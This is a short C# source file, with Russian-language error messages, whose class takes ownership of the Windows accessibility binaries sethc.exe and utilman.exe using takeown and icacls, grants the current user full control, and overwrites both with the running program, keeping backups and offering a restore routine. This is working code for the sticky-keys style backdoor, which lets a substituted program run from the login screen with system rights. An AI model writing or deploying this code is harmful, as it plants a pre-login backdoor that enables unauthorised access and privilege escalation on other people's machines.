using System.Diagnostics;
using System.Security.AccessControl;
using System.Security.Principal;

internal static class AccessibilitySubst
{
    private static readonly string[] TargetFiles = {
        @"C:\Windows\System32\sethc.exe",
        @"C:\Windows\System32\utilman.exe"
    };

    private static void TakeOwnership(string filePath)
    {
        var takeown = Process.Start(new ProcessStartInfo
        {
            FileName = "takeown",
            Arguments = $"/f \"{filePath}\"",
            UseShellExecute = false,
            CreateNoWindow = true
        });
        takeown?.WaitForExit();

        var icacls = Process.Start(new ProcessStartInfo
        {
            FileName = "icacls",
            Arguments = $"\"{filePath}\" /grant \"{Environment.UserName}\":F",
            UseShellExecute = false,
            CreateNoWindow = true
        });
        icacls?.WaitForExit();
    }

    internal static bool SubstituteWithCurrentApp(string currentExePath)
    {
        foreach (var target in TargetFiles)
        {
            try
            {
                TakeOwnership(target);

                string backup = target + ".backup";
                if (!File.Exists(backup))
                    File.Copy(target, backup);

                File.Copy(currentExePath, target, overwrite: true);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка при подмене {target}:\n{ex.Message}", "Ошибка",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
        return true;
    }

    internal static bool RestoreOriginals()
    {
        foreach (var target in TargetFiles)
        {
            try
            {
                string backup = target + ".backup";
                if (!File.Exists(backup))
                {
                    MessageBox.Show($"Резервная копия не найдена: {backup}", "Ошибка",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }

                TakeOwnership(target);
                File.Copy(backup, target, overwrite: true);
                File.Delete(backup);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка при восстановлении {target}:\n{ex.Message}", "Ошибка",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
        return true;
    }
}